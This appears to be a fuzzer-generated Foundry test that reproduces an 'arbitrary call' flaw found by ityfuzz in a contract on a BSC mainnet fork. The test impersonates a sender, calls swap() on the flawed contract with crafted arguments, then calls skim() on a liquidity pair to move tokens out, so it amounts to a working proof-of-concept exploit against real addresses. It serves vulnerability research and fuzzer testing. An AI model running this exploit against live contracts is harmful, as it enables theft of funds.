// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593,0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8,0x0ccee62efec983f3ec4bad3247153009fb483551,0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2 -c bsc --onchain-block-number 26010019 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x0ccee62efec983f3ec4bad3247153009fb483551" to 0x6d8981847eb3cc2234179d0f0e72f6b6b2421a01
================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551.swap{value: 120102998354836578512.9540 Ether}(0x0000000000000000000000000000000000000000, 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551, 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 457301593236342776011363929521216654657845198737397193.4392 Ether, 148873535527911123039.5556 Ether, 0x9Ce4fc52f2fd82873e8239a243F7c69Ed961204C, 0x104d38412c7e7e8c7e7e9c98727e81ff803cbf41)
   │  │  └─ ← ()
   │  │  ├─[3] 0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc.skim(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8)
   │  │  └─ ← ()


 */

contract C6D89 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 26010019);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, 120102998354836578512954023169050558976);
        0x0Ccee62EfEC983f3EC4bAD3247153009FB483551.call{value: 120102998354836578512954023169050558976}(abi.encodeWithSignature(
            "swap(address,address,address,uint256,uint256,address,bytes)",0x0000000000000000000000000000000000000000, 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551, 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 457301593236342776011363929521216654657845198737397193.4392 Ether, 148873535527911123039.5556 Ether, 0x9Ce4fc52f2fd82873e8239a243F7c69Ed961204C, 0x104d38412c7e7e8c7e7e9c98727e81ff803cbf41
        )); 
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc).skim(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
        
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
